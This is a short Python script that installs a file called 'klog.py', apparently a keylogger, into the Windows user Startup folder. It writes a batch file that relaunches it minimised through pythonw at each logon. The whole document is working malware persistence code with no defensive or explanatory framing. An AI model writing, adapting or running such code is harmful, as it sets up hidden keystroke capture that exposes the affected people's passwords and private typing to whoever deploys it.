from shutil import copyfile
import subprocess
import getpass

USER_NAME = getpass.getuser()

def add_to_startup(key_file):
  startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

  with open(startup_path + '\\' + "klog.bat", "w+") as bat_file:
    bat_file.write('start /min cmd /c pythonw "{0}\\{1}"\nexit 0\n'.format(startup_path, key_file))

  copyfile(key_file, startup_path + '\\' + key_file)

  subprocess.Popen('explorer "{0}"'.format(startup_path), shell=False)

add_to_startup("klog.py")
